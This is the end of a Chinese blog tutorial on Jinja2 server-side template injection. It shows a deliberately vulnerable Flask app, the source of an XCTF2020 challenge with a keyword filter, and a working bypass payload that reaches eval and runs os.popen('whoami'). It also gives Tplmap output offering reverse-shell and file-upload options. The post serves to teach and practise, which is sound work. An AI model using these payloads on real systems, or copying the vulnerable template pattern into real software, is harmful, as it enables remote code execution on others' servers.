<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">'__class__'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_hex</span><span class="params">(s)</span>:</span></span><br><span class="line">    c = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        c += <span class="string">r'\x'</span>+i.encode().hex()</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line">print(encode_hex(s))</span><br></pre></td></tr></table></figure>

<h3 id="防护方法"><a href="#防护方法" class="headerlink" title="防护方法"></a>防护方法</h3><ul>
<li><p>对用户输入参数进行限制和检查</p>
</li>
<li><p>使用固定模板</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    name = request.args.get(<span class="string">'name'</span>)</span><br><span class="line">    <span class="keyword">if</span> name:</span><br><span class="line">        t = Template(<span class="string">"Hello：&#123;&#123;n&#125;&#125;"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        t = Template(<span class="string">"Hello,What's your name"</span>)</span><br><span class="line">    <span class="keyword">return</span> t.render(n=name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure>

<figure class="image-box">
                <a rel=web安全-SSTI href="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210129235820486.png" title="image-20210127174548390" data-fancybox="images"><img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210129235820486.png" alt="image-20210127174548390" title class></a>
                <p>image-20210127174548390</p>
            </figure>

<h2 id="XCTF2020华为云"><a href="#XCTF2020华为云" class="headerlink" title="XCTF2020华为云"></a>XCTF2020华为云</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,render_template,redirect</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">safe_msg</span><span class="params">(msg)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'args'</span> <span class="keyword">in</span> msg <span class="keyword">or</span> <span class="string">'_'</span> <span class="keyword">in</span> msg <span class="keyword">or</span>  <span class="string">'path'</span> <span class="keyword">in</span> msg <span class="keyword">or</span> <span class="string">'host'</span> <span class="keyword">in</span> msg <span class="keyword">or</span> <span class="string">'headers'</span> <span class="keyword">in</span> msg <span class="keyword">or</span> <span class="string">'endpoint'</span> <span class="keyword">in</span> msg <span class="keyword">or</span> <span class="string">'json'</span> <span class="keyword">in</span> msg <span class="keyword">or</span> <span class="string">'user_agent'</span> <span class="keyword">in</span> msg <span class="keyword">or</span> <span class="string">'"'</span> <span class="keyword">in</span> msg <span class="keyword">or</span> <span class="string">"'"</span> <span class="keyword">in</span> msg <span class="keyword">or</span> <span class="string">"%"</span> <span class="keyword">in</span> msg:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/", methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"index.html"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/over", methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">over</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'over.html'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/success", methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">success</span><span class="params">()</span>:</span></span><br><span class="line">    msg = request.args.get(<span class="string">"msg"</span>)</span><br><span class="line">    <span class="keyword">if</span>(msg == <span class="literal">None</span>):</span><br><span class="line">        msg = <span class="string">'anonymous'</span></span><br><span class="line">    <span class="keyword">if</span> safe_msg(msg):</span><br><span class="line">        t = Template(<span class="string">"Good Job! "</span> + msg + <span class="string">" . But sorry, there isn't flag"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        t = Template(<span class="string">"You look dangerous....."</span>)</span><br><span class="line">    <span class="keyword">return</span> t.render(request=request)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">'127.0.0.1'</span>, port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure>

<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()|attr(request.values.x1)|attr(request.values.x2)|attr(request.values.x3)()|attr(request.values.x4) (<span class="number">75</span>)|attr(request.values.x5)|attr(request.values.x6)|attr(request.values.x4)(request.values.x7)|attr(request.values.x4)(request.values.x8) (request.values.x9)&#125;&#125;&amp;x1=__class__&amp;x2=__base__&amp;x3=__subclasses__&amp;x4=__getitem__&amp;x5=__init__&amp;x6=__globals__&amp;x7=__builtins__&amp;x8=eval&amp;x9=__import__(<span class="string">'os'</span>).popen(<span class="string">'whoami'</span>).read()</span><br></pre></td></tr></table></figure>

<h2 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h2><h3 id="Tplmap简介"><a href="#Tplmap简介" class="headerlink" title="Tplmap简介"></a>Tplmap简介</h3><p>tplmap通过许多沙盒转义技术来帮助利用代码注入和服务器端模板注入漏洞</p>
<p>下载地址：<code>https://github.com/epinna/tplmap</code></p>
<h3 id="Tplmap使用"><a href="#Tplmap使用" class="headerlink" title="Tplmap使用"></a>Tplmap使用</h3><p>安装依赖</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure>

<p>简单使用</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>./tplmap.py -u url</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span>例子:</span><br><span class="line">root@wisejay:~/桌面/wisejay/tplmap# ./tplmap.py -u http://127.0.0.1:8000?name=1</span><br><span class="line">[+] Tplmap 0.5</span><br><span class="line">    Automatic Server-Side Template Injection Detection and Exploitation Tool</span><br><span class="line"></span><br><span class="line">[+] Testing if GET parameter 'name' is injectable</span><br><span class="line">[+] Smarty plugin is testing rendering with tag '*'</span><br><span class="line">[+] Smarty plugin is testing blind injection</span><br><span class="line">[+] Mako plugin is testing rendering with tag '$&#123;*&#125;'</span><br><span class="line">[+] Mako plugin is testing blind injection</span><br><span class="line">[+] Python plugin is testing rendering with tag 'str(*)'</span><br><span class="line">[+] Python plugin is testing blind injection</span><br><span class="line">[+] Tornado plugin is testing rendering with tag '&#123;&#123;*&#125;&#125;'</span><br><span class="line">[+] Tornado plugin is testing blind injection</span><br><span class="line">[+] Jinja2 plugin is testing rendering with tag '&#123;&#123;*&#125;&#125;'</span><br><span class="line">[+] Jinja2 plugin has confirmed injection with tag '&#123;&#123;*&#125;&#125;'</span><br><span class="line">[+] Tplmap identified the following injection point:</span><br><span class="line"></span><br><span class="line">  GET parameter: name</span><br><span class="line">  Engine: Jinja2</span><br><span class="line">  Injection: &#123;&#123;*&#125;&#125;</span><br><span class="line">  Context: text</span><br><span class="line">  OS: posix-linux</span><br><span class="line">  Technique: render</span><br><span class="line">  Capabilities:</span><br><span class="line"></span><br><span class="line">   Shell command execution: ok</span><br><span class="line">   Bind and reverse shell: ok</span><br><span class="line">   File write: ok</span><br><span class="line">   File read: ok</span><br><span class="line">   Code evaluation: ok, python code</span><br><span class="line"></span><br><span class="line">[+] Rerun tplmap providing one of the following options:</span><br><span class="line"></span><br><span class="line">    --os-shell                          Run shell on the target</span><br><span class="line">    --os-cmd                            Execute shell commands</span><br><span class="line">    --bind-shell PORT                   Connect to a shell bind to a target port</span><br><span class="line">    --reverse-shell HOST PORT   Send a shell back to the attacker's port</span><br><span class="line">    --upload LOCAL REMOTE       Upload files to the server</span><br><span class="line">    --download REMOTE LOCAL     Download remote files</span><br></pre></td></tr></table></figure>

<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
<ol>
<li><a href="https://mp.weixin.qq.com/s/_6ObDR5YKpLFoQXTYXE_pQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/_6ObDR5YKpLFoQXTYXE_pQ</a></li>
<li><a href="https://mp.weixin.qq.com/s/ImO4z6XrY1RFVI1xTivHJw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/ImO4z6XrY1RFVI1xTivHJw</a></li>
<li><a href="https://www.cnblogs.com/bmjoker/p/13508538.html" target="_blank" rel="noopener">https://www.cnblogs.com/bmjoker/p/13508538.html</a></li>
<li><a href="https://blog.csdn.net/qq_45521281/article/details/106243544" target="_blank" rel="noopener">https://blog.csdn.net/qq_45521281/article/details/106243544</a></li>
</ol>
</blockquote>

        </div>
        
<blockquote class="post-copyright">
    <div class="content">
        
<span class="post-time">
    Last updated: <time datetime="2021-02-27T12:26:48.720Z" itemprop="dateUpdated">2021-02-27 20:26:48</time>
</span><br>


        
        转载注明出处，原文地址：<a href="/2021/02/06/SSTI/" target="_blank" rel="external">http://wisejay.xyz/2021/02/06/SSTI/</a>
        
    </div>
    <footer>
        <a href="http://wisejay.xyz">
            <img src="/img/avatar.jpg" alt="Wisejay">
            Wisejay
        </a>
    </footer>
</blockquote>

        
            <div class="page-reward">
    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
</div>

            
        
        <div class="post-footer">
            
	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web安全/">web安全</a></li></ul>

            <div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://wisejay.xyz/2021/02/06/SSTI/&title=《web安全-SSTI》 — Wisejay&pic=http://wisejay.xyz/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://wisejay.xyz/2021/02/06/SSTI/&title=《web安全-SSTI》 — Wisejay&source=" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>

        </div>
        
            


        
    </div>
    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="prev">
      <a href="/2021/02/07/CVE-2020-13942/" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">Apache Unomi 远程代码执行漏洞</h4>
      </a>
    </div>
  

  
    <div class="next">
      <a href="/2021/02/05/暴力破解/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">web安全-暴力破解</h4>
      </a>
    </div>
  
</nav>


    
    
        <aside class="post-widget">
            <nav class="post-toc-wrap" id="post-toc">
                <strong>目录</strong>
                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#SSTI"><span class="post-toc-number">1.</span> <span class="post-toc-text">SSTI</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#原理"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">原理</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#模板引擎"><span class="post-toc-number">1.1.1.</span> <span class="post-toc-text">模板引擎</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#SSTI-服务器端模板注入（Server-Side-Template-Injection）"><span class="post-toc-number">1.1.2.</span> <span class="post-toc-text">SSTI 服务器端模板注入（Server-Side Template Injection）</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#基础知识"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">基础知识</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#基本语法"><span class="post-toc-number">1.2.1.</span> <span class="post-toc-text">基本语法</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#常见方法"><span class="post-toc-number">1.2.2.</span> <span class="post-toc-text">常见方法</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#漏洞形成与防护"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">漏洞形成与防护</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#形成原因"><span class="post-toc-number">1.3.1.</span> <span class="post-toc-text">形成原因</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#构造链路"><span class="post-toc-number">1.3.2.</span> <span class="post-toc-text">构造链路</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#获取对象所属的类"><span class="post-toc-number">1.3.2.1.</span> <span class="post-toc-text">获取对象所属的类</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#获取基类"><span class="post-toc-number">1.3.2.2.</span> <span class="post-toc-text">获取基类</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#获取子类"><span class="post-toc-number">1.3.2.3.</span> <span class="post-toc-text">获取子类</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#寻找利用类脚本"><span class="post-toc-number">1.3.2.4.</span> <span class="post-toc-text">寻找利用类脚本</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#构造语句"><span class="post-toc-number">1.3.2.5.</span> <span class="post-toc-text">构造语句</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#常用方法"><span class="post-toc-number">1.3.3.</span> <span class="post-toc-text">常用方法</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#文件读取"><span class="post-toc-number">1.3.3.1.</span> <span class="post-toc-text">文件读取</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#命令执行"><span class="post-toc-number">1.3.3.2.</span> <span class="post-toc-text">命令执行</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#常用绕过"><span class="post-toc-number">1.3.3.3.</span> <span class="post-toc-text">常用绕过</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#防护方法"><span class="post-toc-number">1.3.4.</span> <span class="post-toc-text">防护方法</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#XCTF2020华为云"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">XCTF2020华为云</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#题目"><span class="post-toc-number">1.4.1.</span> <span class="post-toc-text">题目</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#payload"><span class="post-toc-number">1.4.2.</span> <span class="post-toc-text">payload</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#工具使用"><span class="post-toc-number">1.5.</span> <span class="post-toc-text">工具使用</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Tplmap简介"><span class="post-toc-number">1.5.1.</span> <span class="post-toc-text">Tplmap简介</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Tplmap使用"><span class="post-toc-number">1.5.2.</span> <span class="post-toc-text">Tplmap使用</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#参考链接"><span class="post-toc-number">1.6.</span> <span class="post-toc-text">参考链接</span></a></li></ol></li></ol>
            </nav>
            <div class="toc-bar"><div>
        </aside>
    
</article>

    <div id="reward" class="page-modal reward-lay">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <h3 class="reward-title">
        <i class="icon icon-quote-left"></i>
        我们一起来让这个世界有趣一点
        <i class="icon icon-quote-right"></i>
    </h3>
    <div class="reward-content">
        
        <div class="reward-code">
            <img id="rewardCode" src="/img/reward-wechat.jpg" alt="打赏二维码">
        </div>
        
        <label class="reward-toggle">
            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
                data-wechat="/img/reward-wechat.jpg" data-alipay="/img/reward-alipay.jpg">
            <div class="reward-toggle-ctrol">
                <span class="reward-toggle-item wechat">微信</span>
                <span class="reward-toggle-label"></span>
                <span class="reward-toggle-item alipay">支付宝</span>
            </div>
        </label>
        
    </div>
</div>

    

</div>

    </main>
    <footer class="footer ">
    
    <div class="bottom">
        <p>
            <span>
                Wisejay &copy; 2019 - 2021
            </span>
        		
           	
            
            
            
            

            
                
<span class="site-uv" title="总访客量">
    <i class="icon icon-user"></i>
    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
</span>


<span class="site-pv" title="总访问量">
    <i class="icon icon-eye"></i>
    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
</span>

            
        </p>
    </div>
</footer>

    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://wisejay.xyz/2021/02/06/SSTI/&title=《web安全-SSTI》 — Wisejay&pic=http://wisejay.xyz/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://wisejay.xyz/2021/02/06/SSTI/&title=《web安全-SSTI》 — Wisejay&source=" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      
    </ul>
 </div>


<div class="page-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p>扫一扫，分享到微信</p>
    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAK4AAACuCAAAAACKZ2kyAAABw0lEQVR42u3aQY7DIAwF0N7/0p3tSJ2k3zagjPRYRW0EjywsbPx6xeP9Ma5+//3v5ztXvyweuLi4Y+77diRLJqO37T+2hIuLe5B7FTHun+83kweyxICLi/tkbu/UUf0EuLi4/4ubJy33M+Pi4j6fmyQtVVayysZcDRcXd8CthqQdz1vqu7i4uC3uqqLn2tLq5fy4uLhHuJMDShKk8rJIsi4uLu5Jbl7CSJZflUp9SX5wcXE3cxPKji1VD0C4uLgnuckhpnp8Sd4cBT5cXNzN3GQ3eWvF/EgU5Wq4uLjbuL1JJ9erX4od96UTXFzcI9xeIMtLn5PtLYu7uLi4Le6822FeTKlGKlxc3H3c6lEjKXf22ryiogwuLu4Rbl7urBZNcm7zTVxc3M3carJRqMUOyqlRHxkuLu4R7u6miiRBii5ZcXFxj3DzMFQNT9XxZQZcXNzN3Hdx9Ij5VpdVcHFxcQfcanDpTdpss5isi4uLO+bmwStJTvIwV+4txcXFPc7tBZrqBcmCUIiLi/tIbjWNyZs2og+Ei4v7eG4e7Jp9o2sDGS4ubpE7KZJWr1SrRFxc3PPcBfe0QekkefP+Q+Di4h7h/gAIjFLBIaR7PwAAAABJRU5ErkJggg==" alt="微信分享二维码">
</div>


    
    <!-- main-js -->
<script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.0/jquery.min.js"></script>
<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.4.2"></script>
<script type="text/javascript" src="/js/plugins/ios-orientationchange-fix.js?v=1.4.2"></script>
<script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.js"></script>

<script type="text/javascript" src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>

<script type="text/javascript" src="/js/method.js?v=1.4.2"></script>
<script type="text/javascript" src="/js/blog.js?v=1.4.2"></script>

<!-- third-party -->






<script type="text/javascript" src="/js/plugins/local_search.js?v=1.4.2"></script>
<script type="text/javascript">
	var search_path = "search.xml";
	if (search_path.length === 0) {
		search_path = "search.xml";
	}
	var path = "/" + search_path;
	searchFunc(path, "local-search-input", "local-search-result");
</script>



<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>



    
    





    <!-- mathjax config similar to math.stackexchange -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
            processEscapes: true,
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
        }
    });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for (i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>

<script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>







    
<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/assets/haruto.model.json"},"display":{"position":"right","width":212,"height":472},"mobile":{"show":true},"log":false});</script></body>
</html>
